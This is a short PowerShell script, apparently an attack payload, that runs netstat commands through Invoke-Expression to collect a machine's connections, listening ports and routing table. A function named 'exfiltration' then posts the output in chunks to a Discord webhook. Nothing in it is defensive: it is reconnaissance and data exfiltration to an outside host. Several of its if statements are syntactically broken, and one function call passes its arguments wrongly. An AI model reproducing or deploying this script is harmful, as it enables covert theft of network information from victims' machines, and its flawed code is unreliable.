
# Discord send function
function exfiltration ($command, $text) {
	# Loop for Discord
	$ConstantLimitForRestMethod = 1999
	$TMP_Body = @{
		'username' = $command
		'content' = ""
	}
	for($i = 0; $i -lt $text.Length; $i+=$ConstantLimitForRestMethod){
		try {
			$TMP_Body = @{
				'username' = $command
				'content' = $text.Substring($i, $ConstantLimitForRestMethod)
			}
		} catch [ArgumentOutOfRangeException] {
			if($text.Length-$i -gt 0){
				$TMP_Body = @{
				'username' = $command
				'content' = $text.Substring($i, $text.Length-$i)
				}
			} else {
				break
			}
		}
		Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($TMP_Body | ConvertTo-Json)
	}
}

# send command format
function send_command($command){
	$out = Invoke-Expression $command
	exfiltration($command, $out)
}

# Discord Connection
$hookurl = "$discord"

# Settings
if $default -eq 1{
	send_command("netstat")
}

if $routing_table -eq 1 {
	send_command("netstat -r")
}

if $listening_canonical -eq 1{
	send_command("netstat -af")
}
if $listening_numerical -eq 1{
	send_command("netstat -an")
}
if $all_canonical -eq 1{
	send_command("netstat -qf")
}
if $all_numerical -eq 1{
	send_command("netstat -qn")
}
if $offload -eq 1{
	send_command("netstat -t")
}
if $proto -ne ""{
	# format $proto="TCP"
	$cmd = "netstat -ps " + $proto
	send_command($cmd)
}